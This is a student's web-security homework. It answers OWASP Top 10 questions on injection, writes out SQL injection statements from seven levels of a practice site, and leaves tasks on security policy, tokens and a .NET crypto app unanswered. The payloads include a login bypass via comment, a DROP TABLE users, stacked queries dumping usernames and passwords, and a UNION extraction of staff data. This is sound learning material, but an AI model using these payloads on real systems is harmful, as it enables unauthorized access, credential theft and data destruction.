1. L’organització OWASP Foundation va actualitzar en 2021 el seu Top 10 de vulnerabilitats més trobades en aplicacions web.

a. Escull 3 vulnerabilitats d’aquesta llista i descriu-les. Escriu l’impacte que tenen a la seguretat i quins danys pot arribar a fer un atac en aquesta vulnerabilitat. Enumera diferents mesures i tècniques per poder evitar-les.

  A03:2021 - Inyección: Este tipo de vulnerabilidad ocurre los datos introducidos por el usuario no son verificados, se invocan consultas dinámicas o no parametrizadas sin tener en cuanta la relacion entre los parámetros y el contexto. Tambien ocurre cuando se introducen datos dañinos dentro de los parametros de busqueda (ORM) para conseguir informacion privada.

  Como evitar esta vulnerabilidad: la opcion más popular es utilizar una API segura, que evite el uso de un intérprete por completo y proporcione una interfaz parametrizada o utilizar una herramienta de ORM.
Nota: Incluso cuando se parametrizan, los procedimientos almacenados pueden introducir una inyección SQL si el procedimiento PL/SQL o T-SQL concatena consultas y datos, o se ejecutan parámetros utilizando EXECUTE IMMEDIATE o exec().

Tambien se pueden utilizar las conocidas "White List" para implementar validaciones de entrada, aun que por desgracia esto no es completamente seguroo debido a que muchas aplicaciones requieren el uso de caracteres especiales, como en campos de texto o APIs para aplicaciones móviles.

Para evitar que una fuga masiva de datos se puede utilizar "Limit" y consultas SQL.

Daños a causa de esta vulnerabilidad: 
  
2. Obre el següent enllaç (sql inseckten) i realitza un mínim de 7 nivells fent servir tècniques d’injecció SQL. 

a. Copia cada una de les sentències SQL resultant que has realitzat a cada nivell i comenta que has aconseguit.
Tutorial:
SELECT username 
FROM users 
WHERE username ='jane' AND password ='0e274e1d1a8948f16f0227e4ec1965a8';
Ej 1
SELECT username 
FROM users 
WHERE username ='jane'--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
Entrar con un usuario y sin contraseña, comentando todo lo posterior al nombre
Ej 2
SELECT username 
FROM users 
WHERE username ='';DROP TABLE users;--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
He conseguido eliminar la tabla users, terminando la sentencia esperada por el codigo y escribiendo la sentencia necesaria para borrar dicha tabla
Ej 3
SELECT username 
FROM users 
WHERE username =''; SELECT username FROM users --' AND password ='d41d8cd98f00b204e9800998ecf8427e';
He conseguido  todos los nombres, terminando la sentencia y escribiendo una nueva
Ej 4
SELECT username 
FROM users 
WHERE username =''; SELECT username FROM users limit 1--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
He conseguido un nombre, terminando la sentencia y despues escribiendo la sentencia necesaria limitando las respuestas a una
Ej 5
SELECT product_id, brand, size, price 
FROM shoes 
WHERE brand='Nicke';
He conseguido que me muestre los productos de la marca nike

SELECT product_id, brand, size, price 
FROM shoes 
WHERE brand=''; SELECT username, password FROM users --';
He conseguido los nombres y las contraseñas, terminando las sentencia y escribiendo lo que necesitaba recordando los ejercicios anteriores
Ej 6
SELECT username 
FROM users 
WHERE username =''; SELECT salary AS username FROM staff WHERE firstname = 'Greta Maria'--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
He conseguido la cifra de cuanto cobra Greta Maria, termionando la sentencia y creando otra haciendo que el salario lo interprete como el usuario y luego solo poner la restriccion
Ej 7
SELECT product_id, brand, size, price 
FROM shoes 
WHERE brand=''UNION SELECT staff_id, name, firstname, email, salary, employed_since FROM staff--';
He conseguido todos los campos mencionados, con ayuda de la pista que te da la web, la unica complicacion era mi desconocimineto del 'UNION' una vez resueto todo lo demás es facil

b. Enumera i raona diferents formes que pot evitar un atac per SQL injection en projectes fets amb Razor Pages i Entity Framework. 


3. L’empresa a la qual treballes desenvoluparà una aplicació web de venda d’obres d’art. Els artistes registren les seves obres amb fotografies, títol, descripció i preu.  Els clients poden comprar les obres i poden escriure ressenyes públiques dels artistes a qui han comprat. Tant clients com artistes han d’estar registrats. L’aplicació guarda nom, cognoms, adreça completa, dni i telèfon. En el cas dels artistes guarda les dades bancaries per fer els pagaments. Hi ha un tipus d’usuari Acount Manager que s’encarrega de verificar als nous artistes. Un cop aprovats poden pública i vendre les seves obres.

Ara es vol aplicar aplicant els principis  de seguretat per tal de garantir el servei i la integritat de les dades. T’han encarregat l'elaboració de part de les polítiques de seguretat. Elabora els següents apartats:

a. Definició del control d’accés: enumera els rols  i quin accés a dades tenen cada rol. 

b. Definició de la política de contrasenyes: normes de creació, d’ús i canvi de contrasenyes. Raona si són necessàries diferents polítiques segons el perfil d’usuari.

c. Avaluació de la informació: determina quin valor tenen les dades que treballa l'aplicació. Determina com tractar les dades més sensibles. Quines dades encriptaries?

4. En el control d’accessos, existeixen mètodes d’autenticació basats en tokens. Defineix l’autenticació basada en tokens. Quins tipus hi ha? Com funciona mitjançant la web? Cerca llibreries .Net que ens poden ajudar a implementar autenticació amb tokens.

5. Crea un projecte de consola amb un menú amb tres opcions:

a. Registre: l’usuari ha d’introduir username i una password. De la combinació dels dos camps guarda en memòria directament l'encriptació. Utilitza l’encriptació de hash HA256. Mostra per pantalla el resultat.

b. Verificació de dades: usuari ha de tornar a introduir les dades el programa mostra per pantalla si les dades són correctes.

c. Encriptació i desencriptació amb RSA. L’usuari entrarà un text per consola. A continuació mostra el text encriptat i en la següent línia el text desencriptat. L’algoritme de RSA necessita una clau pública per encriptar i una clau privada per desencriptar. No cal guardar-les en memòria persistent.

Per realitzar aquest exercici utilitza la llibreria System.Security.Cryptography.

6.  Referències:

